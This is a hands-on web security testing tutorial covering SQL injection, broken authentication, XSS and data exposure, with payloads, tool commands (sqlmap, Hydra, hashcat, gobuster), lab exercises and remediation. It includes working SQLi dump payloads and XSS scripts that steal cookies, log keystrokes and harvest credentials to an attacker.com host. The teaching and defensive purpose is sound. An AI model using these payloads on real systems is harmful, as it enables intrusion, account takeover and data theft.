# Security Vulnerability Testing Guide

> Hands-on testing techniques for SQL Injection, Broken Authentication, Cross-Site Scripting (XSS), and Sensitive Data Exposure — with payloads, tools, and remediation.

---

## Table of Contents

1. [SQL Injection (SQLi)](#1-sql-injection-sqli)
2. [Broken Authentication](#2-broken-authentication)
3. [Cross-Site Scripting (XSS)](#3-cross-site-scripting-xss)
4. [Sensitive Data Exposure](#4-sensitive-data-exposure)
5. [Testing Checklist](#5-testing-checklist)
6. [Tools Reference](#6-tools-reference)

---

> ⚠️ **Legal Notice:** Perform all tests exclusively on systems you own or have explicit written authorization to test (e.g., DVWA, Juice Shop, TryHackMe labs). Unauthorized testing is a criminal offense.

---

## 1. SQL Injection (SQLi)

### What is SQL Injection?

SQL Injection occurs when untrusted user input is incorporated into a database query without proper sanitization, allowing attackers to manipulate the query logic — reading, modifying, or deleting data they shouldn't access.

**OWASP Category:** A03 — Injection  
**CVSS Score Range:** 7.5 – 10.0 (Critical)

---

### How It Works

**Vulnerable PHP code example:**
```php
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
```

**Attacker input:**
```
' OR '1'='1
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

This returns ALL rows because `'1'='1'` is always true.

---

### Types of SQL Injection

| Type | Description | Detection Method |
|------|-------------|-----------------|
| **In-band (Classic)** | Results returned directly in the response | Visible data in page output |
| **Error-based** | Database errors reveal structure/data | Error messages in response |
| **Union-based** | UNION SELECT appends attacker query | Extra data in response |
| **Blind (Boolean)** | No visible output — infer from True/False responses | Response size/content differences |
| **Blind (Time-based)** | Use `SLEEP()` to infer data from response time | Response delay |
| **Out-of-band** | Data exfiltrated via DNS/HTTP requests | External callback (Burp Collaborator) |

---

### Testing for SQL Injection

#### Step 1 — Identify Injection Points

Look for any input that touches a database:
- URL parameters: `?id=1`, `?search=admin`
- Login forms (username/password fields)
- Search boxes
- HTTP headers: `User-Agent`, `Referer`, `Cookie`
- JSON/XML API request bodies

#### Step 2 — Probe for Errors

Submit these characters and observe the response:

```
'
''
`
')
"))
' --
' #
1; DROP TABLE users--
```

**Signs of vulnerability:**
- Database error messages (`You have an error in your SQL syntax`)
- Blank page or unexpected behavior
- Response time changes

#### Step 3 — Confirm Vulnerability

**Boolean-based confirmation:**
```
# True condition (returns normal result)
?id=1 AND 1=1

# False condition (returns empty/different result)
?id=1 AND 1=2
```

**Time-based confirmation:**
```sql
-- MySQL
?id=1' AND SLEEP(5)--

-- MSSQL
?id=1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
?id=1'; SELECT pg_sleep(5)--
```

If the page delays by ~5 seconds, the parameter is vulnerable.

---

### Manual SQLi Payloads

#### Authentication Bypass
```sql
-- Login form bypass (username field)
admin'--
admin'#
' OR '1'='1'--
' OR 1=1--
admin' /*
' OR 'x'='x

-- Both username and password
Username: admin'--
Password: anything
```

#### Union-Based Data Extraction

```sql
-- Step 1: Find number of columns
?id=1 ORDER BY 1--   (increase until error)
?id=1 ORDER BY 2--
?id=1 ORDER BY 3--   (error = 3 columns exist)

-- Step 2: Find printable columns
?id=-1 UNION SELECT NULL, NULL, NULL--
?id=-1 UNION SELECT 'a', NULL, NULL--

-- Step 3: Extract database info
?id=-1 UNION SELECT version(), user(), database()--

-- Step 4: Extract table names
?id=-1 UNION SELECT table_name, NULL, NULL 
FROM information_schema.tables 
WHERE table_schema=database()--

-- Step 5: Extract column names
?id=-1 UNION SELECT column_name, NULL, NULL 
FROM information_schema.columns 
WHERE table_name='users'--

-- Step 6: Dump data
?id=-1 UNION SELECT username, password, email FROM users--
```

#### Error-Based Extraction (MySQL)
```sql
?id=1' AND extractvalue(1, concat(0x7e, (SELECT version())))--
?id=1' AND updatexml(1, concat(0x7e, (SELECT database())), 1)--
```

---

### Automated Testing with SQLMap

```bash
# Basic scan on URL parameter
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low"

# Enumerate databases
sqlmap -u "http://localhost/..." --dbs

# Enumerate tables in a database
sqlmap -u "http://localhost/..." -D dvwa --tables

# Dump a specific table
sqlmap -u "http://localhost/..." -D dvwa -T users --dump

# Test POST request
sqlmap -u "http://localhost/login" \
  --data="username=admin&password=test" \
  --level=3 --risk=2

# Use request file captured from Burp Suite
sqlmap -r request.txt --dbs
```

**SQLMap risk/level flags:**

| Flag | Range | Description |
|------|-------|-------------|
| `--level` | 1–5 | Depth of tests (1=basic, 5=all vectors) |
| `--risk` | 1–3 | Aggressiveness (3 includes UPDATE/DELETE payloads) |

---

### Testing SQLi in Burp Suite

```
1. Capture login/search request in Proxy → HTTP History
2. Right-click → Send to Repeater
3. Modify the vulnerable parameter with payloads
4. Observe response differences
5. Send to Intruder for automated payload testing:
   - Positions: mark the parameter value
   - Payloads: load SQLi wordlist
   - Grep Match: add "SQL", "error", "syntax" to flag hits
```

---

### DVWA Practice — SQL Injection Module

```
URL: http://localhost/dvwa/vulnerabilities/sqli/
Security Level: Low

Test payloads in the "User ID" field:
1. Enter: '                        → triggers SQL error
2. Enter: 1' OR '1'='1             → dumps all users
3. Enter: 1' UNION SELECT user(),database()-- 
                                   → reveals DB user and name
```

---

### SQLi Remediation

| Fix | Implementation |
|-----|---------------|
| **Parameterized Queries** | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);` |
| **Stored Procedures** | Pre-compiled SQL with no dynamic construction |
| **Input Validation** | Whitelist expected formats (integers, alphanumeric) |
| **Least Privilege** | DB user should only have SELECT, not DROP/ALTER |
| **WAF** | Web Application Firewall to filter malicious patterns |
| **Error Handling** | Never expose raw DB errors to users |

---

## 2. Broken Authentication

### What is Broken Authentication?

Broken Authentication refers to flaws in how an application manages user identity — including login mechanisms, session tokens, password storage, and logout — that allow attackers to compromise accounts or hijack sessions.

**OWASP Category:** A07 — Identification and Authentication Failures  
**CVSS Score Range:** 7.0 – 9.8 (High to Critical)

---

### Common Broken Authentication Vulnerabilities

| Vulnerability | Description |
|--------------|-------------|
| Weak credentials | Passwords like `admin/admin`, `user/1234` accepted |
| No brute-force protection | Unlimited login attempts allowed |
| Weak password policy | Short, simple passwords permitted |
| Insecure session tokens | Predictable or short token values |
| No session expiry | Tokens valid indefinitely |
| Session fixation | Attacker pre-sets victim's session ID |
| Credential exposure | Passwords in URLs, logs, or source code |
| Insecure "Remember Me" | Permanent cookie without expiry |

---

### Testing for Broken Authentication

#### Test 1 — Default & Weak Credentials

Try common credential pairs on the login page:

```
admin / admin
admin / password
admin / 123456
admin / admin123
user / user
test / test
root / root
guest / guest
```

**Tools:**
```bash
# Hydra brute-force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  http-post-form \
  "localhost/login:username=^USER^&password=^PASS^:Invalid credentials"

# Medusa
medusa -h localhost -U users.txt -P passwords.txt \
  -M http -m DIR:/login -m FORM:username=^USER^&password=^PASS^
```

#### Test 2 — Brute-Force with Burp Intruder

```
1. Capture login POST request → Send to Intruder
2. Attack Type: Cluster Bomb
3. Positions: mark §username§ and §password§
4. Payload Set 1: usernames list
5. Payload Set 2: passwords list (rockyou.txt)
6. Options → Grep Match: add "Welcome", "Dashboard", "Logout"
7. Start Attack → filter by response length/match
```

**Check for rate limiting:** If the server doesn't block or slow down after 10–20 failed attempts, it's vulnerable.

#### Test 3 — Session Token Analysis

Capture session cookies and analyze:

```
1. Proxy → HTTP History → find Set-Cookie header
2. Note the session token value
3. Decode if Base64: 
   echo "dXNlcjoxMjM=" | base64 -d
4. Check for predictable patterns:
   - Sequential numbers
   - Timestamps
   - Username encoded in token
5. Log in multiple times → compare tokens for randomness
```

**Burp Sequencer** — Test token randomness:
```
HTTP History → right-click Set-Cookie response → Send to Sequencer
Token Location → select the cookie value
Start Live Capture → collect 200+ tokens
Analyze → check entropy score (should be > 100 bits)
```

#### Test 4 — Session Fixation

```
1. Obtain a session ID before login: visit /login, note sessionid
2. Log in with valid credentials
3. Check if the session ID changes after login
4. If session ID remains the same → Session Fixation vulnerability
```

**Attack scenario:**
```
1. Attacker visits site → gets session ID: abc123
2. Attacker tricks victim: http://site.com/login?sessionid=abc123
3. Victim logs in → server binds abc123 to victim's account
4. Attacker uses abc123 → accesses victim's session
```

#### Test 5 — Session Expiry

```
1. Log in and copy the session token
2. Log out
3. Replay the old session token in Repeater:
   GET /dashboard HTTP/1.1
   Cookie: session=old_token_here
4. If access is granted → session not invalidated on logout
```

#### Test 6 — Password Reset Weaknesses

```
1. Test if reset tokens expire (use a 24h+ old link)
2. Test if tokens are reusable after being used once
3. Check if reset tokens are predictable (sequential, timestamp-based)
4. Test for username enumeration:
   - "Email not found" vs "Reset link sent" (different for valid/invalid)
5. Check if reset link contains password in URL
```

#### Test 7 — Cookie Security Flags

Inspect cookies in browser DevTools or Burp:

```
Set-Cookie: session=abc123; Path=/
```

**Missing flags to report:**

| Flag | Purpose | Risk if Missing |
|------|---------|----------------|
| `HttpOnly` | Prevents JS access | XSS can steal session |
| `Secure` | HTTPS-only transmission | Cookie sent over HTTP |
| `SameSite=Strict` | Blocks cross-site sending | CSRF attacks possible |

---

### DVWA Practice — Brute Force Module

```
URL: http://localhost/dvwa/vulnerabilities/brute/
Security Level: Low

1. Capture login request in Burp Proxy
2. Send to Intruder
3. Mark §password§ as payload position
4. Load payload: /usr/share/wordlists/rockyou.txt
5. Start attack → look for response length outlier
   (correct password response is different size)
```

---

### Juice Shop Practice — Authentication Challenges

```
1. Login as admin:
   Email: admin@juice-sh.op
   Password: admin123   ← try common passwords

2. SQL injection on login:
   Email: ' OR 1=1--
   Password: anything

3. Find exposed admin credentials in the application source
4. Exploit JWT token manipulation (change role to "admin")
```

---

### Broken Authentication Remediation

| Fix | Detail |
|-----|--------|
| **Multi-Factor Authentication** | Require TOTP/SMS for sensitive accounts |
| **Account Lockout** | Lock after 5–10 failed attempts; use CAPTCHA |
| **Strong Password Policy** | Minimum 12 chars, complexity, breached-password check |
| **Secure Session Tokens** | Cryptographically random, 128+ bits of entropy |
| **Session Expiry** | Idle timeout (15–30 min), absolute timeout (8–24 hrs) |
| **Invalidate on Logout** | Server-side session destruction |
| **HttpOnly + Secure Cookies** | Prevent XSS theft and HTTP transmission |
| **Regenerate Session ID** | Issue new token after successful login |

---

## 3. Cross-Site Scripting (XSS)

### What is XSS?

XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. The browser trusts content from the server and executes the injected script — giving attackers access to cookies, session tokens, keystrokes, or the ability to redirect users.

**OWASP Category:** A03 — Injection  
**CVSS Score Range:** 4.3 – 8.8 (Medium to High)

---

### Types of XSS

| Type | How It Works | Persistence |
|------|-------------|-------------|
| **Reflected** | Payload in URL/request, reflected in response | Non-persistent (per request) |
| **Stored (Persistent)** | Payload saved in DB, served to all users | Persistent |
| **DOM-based** | Payload processed by client-side JS, never hits server | Non-persistent |
| **Blind XSS** | Payload stored, triggers in admin/backend panel | Delayed |

---

### Testing for XSS

#### Step 1 — Identify Reflection Points

Any input that appears in the HTML output:
- Search fields
- Comment boxes, forum posts
- User profile fields (name, bio)
- URL parameters reflected in page content
- Error messages (`"abc" not found`)
- HTTP headers reflected in response (`User-Agent`, `Referer`)

#### Step 2 — Basic Probe Payloads

Start with harmless probes to confirm reflection:

```javascript
// Basic alert test
<script>alert(1)</script>
<script>alert('XSS')</script>

// If script tags are filtered, try event handlers
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// If quotes are filtered
<img src=x onerror=alert`1`>

// Polyglot payload (works in many contexts)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### Step 3 — Context-Aware Payloads

Identify where your input lands in the HTML source:

**Context 1 — Inside HTML tag content:**
```html
<!-- Input reflected as: -->
<p>YOURINPUT</p>

<!-- Payloads: -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**Context 2 — Inside an HTML attribute:**
```html
<!-- Input reflected as: -->
<input value="YOURINPUT">

<!-- Payloads: -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><img src=x onerror=alert(1)>
```

**Context 3 — Inside a JavaScript string:**
```html
<!-- Input reflected as: -->
<script>var name = 'YOURINPUT';</script>

<!-- Payloads: -->
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

**Context 4 — Inside a URL attribute:**
```html
<!-- Input reflected as: -->
<a href="YOURINPUT">Click</a>

<!-- Payloads: -->
javascript:alert(1)
```

#### Step 4 — Filter Bypass Techniques

When basic payloads are blocked:

```javascript
// Case variation
<ScRiPt>alert(1)</sCrIpT>

// HTML encoding
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

// Double encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E

// Null bytes
<scr\x00ipt>alert(1)</script>

// No parentheses (using template literals)
<script>alert`1`</script>

// Using SVG
<svg><script>alert(1)</script></svg>

// Using details tag
<details open ontoggle=alert(1)>

// Iframe srcdoc
<iframe srcdoc="<script>alert(1)</script>">
```

---

### Exploiting XSS — Beyond alert(1)

#### Session Cookie Theft
```javascript
// Send cookie to attacker's server
<script>
  document.location='http://attacker.com/steal?c='+document.cookie
</script>

// Using Image technique
<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
```

#### Keylogger
```javascript
<script>
  document.onkeypress = function(e) {
    fetch('http://attacker.com/log?k=' + e.key);
  }
</script>
```

#### Phishing / Credential Harvesting
```javascript
<script>
  document.body.innerHTML = '<form action="http://attacker.com/phish" method="POST">' +
    '<input name="username" placeholder="Username"><br>' +
    '<input type="password" name="password" placeholder="Password"><br>' +
    '<button>Login</button></form>';
</script>
```

#### BeEF Hook (Browser Exploitation Framework)
```javascript
// Hook victim's browser to BeEF C2
<script src="http://attacker.com:3000/hook.js"></script>
```

---

### Testing XSS with Burp Suite

```
1. Proxy → HTTP History → find reflected parameters
2. Send to Repeater
3. Insert payload in parameter value
4. Check response for unescaped output
5. Use Burp Scanner (Pro) for automated XSS detection
6. Use DOM Invader (Burp's browser extension) for DOM XSS
```

**DOM XSS testing — browser console:**
```javascript
// Check for dangerous sinks
document.getElementById('output').innerHTML  // sink
location.hash                                 // source
document.write(location.search)              // source + sink
```

---

### DVWA Practice — XSS Modules

#### Reflected XSS
```
URL: http://localhost/dvwa/vulnerabilities/xss_r/
Security Level: Low

Input: <script>alert(document.cookie)</script>
Observe: Alert box shows session cookie
```

#### Stored XSS
```
URL: http://localhost/dvwa/vulnerabilities/xss_s/
Security Level: Low

Name field: test
Message field: <script>alert('Stored XSS!')</script>
Submit → refresh page → payload executes for every visitor
```

#### DOM-based XSS
```
URL: http://localhost/dvwa/vulnerabilities/xss_d/
Security Level: Low

Modify URL: ?default=<script>alert(1)</script>
Observe page source → script tag injected into DOM
```

---

### Juice Shop Practice — XSS Challenges

```
1. DOM XSS: Search for <iframe src="javascript:alert(`xss`)">
2. Reflected XSS: Manipulate the tracking parameter in order confirmation
3. Persistent XSS: Inject into user profile/feedback fields
4. Find the "Score Board" page for challenge hints: /#/score-board
```

---

### XSS Remediation

| Fix | Implementation |
|-----|---------------|
| **Output Encoding** | HTML-encode all dynamic output: `&lt;`, `&gt;`, `&amp;`, `&quot;` |
| **Content Security Policy** | `Content-Security-Policy: default-src 'self'` header |
| **HttpOnly Cookies** | Prevents `document.cookie` access |
| **Input Validation** | Whitelist expected characters; reject or strip others |
| **Avoid `innerHTML`** | Use `textContent` or `innerText` in JavaScript |
| **DOMPurify** | Sanitize HTML before inserting into DOM |
| **X-XSS-Protection** | Legacy header: `X-XSS-Protection: 1; mode=block` |
| **Trusted Types** | Modern API to prevent DOM XSS at the browser level |

**Secure output encoding example (PHP):**
```php
// Vulnerable
echo "Hello, " . $_GET['name'];

// Secure
echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

---

## 4. Sensitive Data Exposure

### What is Sensitive Data Exposure?

Sensitive Data Exposure occurs when applications fail to adequately protect confidential information — such as passwords, financial data, health records, or PII — both in transit and at rest. This includes using weak encryption, exposing data in URLs or logs, or transmitting data over unencrypted channels.

**OWASP Category:** A02 — Cryptographic Failures  
**CVSS Score Range:** 5.0 – 9.1 (Medium to Critical)

---

### Categories of Sensitive Data

| Category | Examples |
|----------|---------|
| **Credentials** | Passwords, API keys, tokens, private keys |
| **Financial** | Credit card numbers, bank account details, PAN |
| **Personal (PII)** | Full name, DOB, SSN, address, phone number |
| **Health (PHI)** | Medical records, prescriptions, diagnoses |
| **Session Data** | Session tokens, JWTs, cookies |
| **Business** | Trade secrets, source code, internal documents |

---

### Testing for Sensitive Data Exposure

#### Test 1 — Unencrypted Transmission (HTTP vs HTTPS)

```bash
# Check if HTTP redirects to HTTPS
curl -v http://target.com 2>&1 | grep -E "Location|HTTP/"

# Check SSL/TLS configuration
nmap --script ssl-enum-ciphers -p 443 target.com

# Test with SSLyze
sslyze target.com

# Online tool
# https://www.ssllabs.com/ssltest/
```

**Look for:**
- No redirect from HTTP to HTTPS
- Weak ciphers (DES, RC4, 3DES)
- Expired or self-signed certificates
- SSLv2, SSLv3, TLS 1.0 support (deprecated)
- Missing HSTS header

#### Test 2 — Sensitive Data in HTTP Traffic (Burp Suite)

```
1. Browse the entire application with Burp intercepting
2. Target → Site Map → right-click → Search
3. Search for keywords in responses:
   - password, passwd, pwd
   - credit_card, card_number, cvv
   - ssn, social_security
   - secret, api_key, token, private_key
   - Bearer, AWS_SECRET, PRIVATE KEY
```

**Burp Search across all traffic:**
```
Proxy → HTTP History → filter bar → type "password"
Also check: Response headers for sensitive data leaks
```

#### Test 3 — JavaScript Files & Source Code Leaks

```bash
# Download and grep JS files
curl https://target.com/static/app.js | grep -iE \
  "api_key|secret|password|token|credential|auth"

# Check HTML source comments
curl https://target.com | grep -E "<!--.*-->"

# Browser DevTools → Sources tab → search across all files
# DevTools → Network → filter by JS → open each file → search
```

**Common leaks in JS files:**
```javascript
// Hardcoded API keys
const API_KEY = "sk-1234abcd...";

// Hardcoded credentials
const config = { user: "admin", pass: "SuperSecret123" };

// Internal endpoints
fetch("http://internal-api.company.local/v2/users");
```

#### Test 4 — Sensitive Data in URLs

Sensitive data should never appear in URLs (they are logged by servers, browsers, and proxies):

```
# Bad - password in URL
http://site.com/reset?token=abc&email=user@email.com&password=newpass

# Bad - session in URL
http://site.com/dashboard?sessionid=abc123

# Bad - credit card in URL
http://site.com/pay?card=4111111111111111&cvv=123
```

**Test:**
```
1. Burp → HTTP History → review all GET parameters
2. Search for: password, token, key, ssn, card in URL
3. Check Referer header — URLs are sent in Referer to third-party links
```

#### Test 5 — Weak Password Storage

```
1. Register with a known password
2. If you get DB access (via SQLi), check password storage:

-- MD5 (vulnerable): 5f4dcc3b5aa765d61d8327deb882cf99
-- SHA1 (vulnerable): 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
-- Bcrypt (secure): $2y$10$...
-- Argon2 (secure): $argon2id$...

3. Test if MD5/SHA1 hashes crack instantly:
   # Online tools: crackstation.net, hashes.com
   # Local: hashcat, john the ripper
```

```bash
# Crack MD5 with hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crack SHA1
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

#### Test 6 — Directory Listing & Exposed Files

```bash
# Directory brute-forcing
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt

# Look for sensitive file extensions
gobuster dir -u http://localhost \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak,old,config,env,log,sql,zip,tar

# Common sensitive file paths to check manually
/.env
/.git/config
/config.php
/database.yml
/wp-config.php
/web.config
/backup.sql
/phpinfo.php
/.htpasswd
/server-status
/robots.txt    ← often reveals hidden paths
/sitemap.xml
```

#### Test 7 — HTTP Response Headers Analysis

```bash
# Check security headers
curl -I https://target.com

# Use online tool
# https://securityheaders.com

# Expected secure headers:
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=()
```

**Missing headers to flag:**
- No `Strict-Transport-Security` → HTTPS not enforced
- No `X-Content-Type-Options` → MIME sniffing possible
- `Server: Apache/2.4.1` → version disclosure
- `X-Powered-By: PHP/5.3.1` → technology disclosure

#### Test 8 — Error Messages & Stack Traces

Trigger errors and observe what's disclosed:

```
1. Submit unexpected input types (array instead of string)
2. Access non-existent pages/resources
3. Submit malformed JSON/XML to APIs
4. Try accessing admin paths without auth

Look for:
- Stack traces revealing file paths: /var/www/html/app/models/User.php
- Database errors revealing table/column names
- Server version information
- Internal IP addresses or hostnames
- Framework/library versions
```

#### Test 9 — JWT Token Analysis

```bash
# Decode JWT (3 base64 parts separated by dots)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d

# Online: jwt.io → paste token to decode

# Common JWT vulnerabilities:
# 1. Algorithm set to "none"
# Craft token: {"alg":"none"} + payload + empty signature

# 2. Weak secret (HS256)
# Crack with hashcat:
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# 3. Sensitive data in payload (never encrypted, only encoded)
# Check for: email, role, user_id, permissions
```

---

### DVWA Practice — Sensitive Data Exposure

```
# Check for SQL injection → dump password hashes
URL: http://localhost/dvwa/vulnerabilities/sqli/
Payload: 1' UNION SELECT user, password FROM users#

# Hashes returned (MD5) — crack them:
# 5f4dcc3b5aa765d61d8327deb882cf99 = password
# Use crackstation.net or hashcat

# Check phpinfo exposure
URL: http://localhost/phpinfo.php
Reveals: PHP version, server config, environment variables
```

---

### Juice Shop Practice — Data Exposure Challenges

```
1. Access the confidential document hidden in /ftp/ directory
2. Find the exposed admin email in the source code
3. Retrieve the forgotten backup file from /ftp/
4. Exploit the exposed API to retrieve all user credentials
5. Find API keys or secrets hardcoded in JavaScript files
   DevTools → Sources → search for "apiKey", "secret", "password"
```

---

### Sensitive Data Exposure Remediation

| Area | Fix |
|------|-----|
| **Encryption in Transit** | Enforce HTTPS/TLS 1.2+; implement HSTS |
| **Encryption at Rest** | Encrypt databases, backups, and file stores |
| **Password Storage** | Use bcrypt, Argon2, or scrypt (never MD5/SHA1) |
| **Minimize Data** | Don't store what you don't need (card CVVs, etc.) |
| **Secure Headers** | Implement all security response headers |
| **No Data in URLs** | Use POST bodies for sensitive data |
| **Error Handling** | Generic error messages; log details server-side only |
| **API Key Management** | Use environment variables, not hardcoded values |
| **Disable Directory Listing** | Apache: `Options -Indexes`; Nginx: `autoindex off` |
| **Cache Control** | `Cache-Control: no-store` for sensitive pages |

---

## 5. Testing Checklist

Use this checklist during each assessment:

### SQL Injection
- [ ] Identified all input parameters (GET, POST, headers, cookies)
- [ ] Submitted special characters and observed errors
- [ ] Tested boolean-based and time-based blind SQLi
- [ ] Attempted authentication bypass via login forms
- [ ] Ran SQLMap for automated enumeration
- [ ] Tested stored procedures and second-order injection
- [ ] Checked for ORM-based injections (HQL, JPQL)

### Broken Authentication
- [ ] Tested default and common credentials
- [ ] Verified brute-force/rate-limiting protection
- [ ] Analyzed session token entropy with Burp Sequencer
- [ ] Checked session cookie flags (HttpOnly, Secure, SameSite)
- [ ] Verified session invalidation on logout
- [ ] Tested session fixation
- [ ] Reviewed password reset flow for weaknesses
- [ ] Tested MFA bypass techniques

### XSS
- [ ] Identified all reflection points (search, comments, forms)
- [ ] Tested reflected XSS with basic `<script>alert(1)</script>`
- [ ] Tested stored XSS in persistent fields
- [ ] Analyzed DOM-based sinks (innerHTML, document.write)
- [ ] Attempted filter bypasses (encoding, case variation, events)
- [ ] Tested for blind XSS in admin/backend panels
- [ ] Verified Content-Security-Policy header effectiveness
- [ ] Checked HttpOnly flag on session cookies

### Sensitive Data Exposure
- [ ] Verified HTTPS enforced on all pages (no HTTP fallback)
- [ ] Checked TLS version and cipher strength
- [ ] Reviewed JS files and page source for hardcoded secrets
- [ ] Searched HTTP history for sensitive data in GET parameters
- [ ] Checked all response headers for security headers
- [ ] Reviewed error messages for information disclosure
- [ ] Tested for exposed files (.env, .git, backup files)
- [ ] Analyzed JWT tokens for weak signing and sensitive payload data
- [ ] Checked password storage mechanism (via SQLi or source review)
- [ ] Verified directory listing is disabled

---

## 6. Tools Reference

| Tool | Category | Use Case |
|------|----------|----------|
| **Burp Suite** | Proxy/Scanner | All-in-one web testing platform |
| **SQLMap** | SQLi | Automated SQL injection detection & exploitation |
| **Hydra** | Auth | Password brute-forcing |
| **Hashcat** | Crypto | Password hash cracking |
| **John the Ripper** | Crypto | Password hash cracking |
| **Nikto** | Recon | Web server misconfiguration scanner |
| **Gobuster** | Recon | Directory and file brute-forcing |
| **BeEF** | XSS | Browser exploitation framework |
| **SSLyze** | Crypto | TLS/SSL configuration analysis |
| **Wappalyzer** | Recon | Technology fingerprinting |
| **jwt.io** | Crypto | JWT decode/encode/verify |
| **CrackStation** | Crypto | Online hash cracking (MD5, SHA1) |
| **OWASP ZAP** | Scanner | Open-source web app scanner |
| **DOMPurify** | XSS (Dev) | Client-side HTML sanitization library |

---

> **Practice Environment Reminder:**
> - DVWA: `http://localhost/dvwa` — Set security to **Low** to start
> - Juice Shop: `http://localhost:3000` — Check `/#/score-board` for challenges
> - PortSwigger Web Academy: `https://portswigger.net/web-security` — Free guided labs
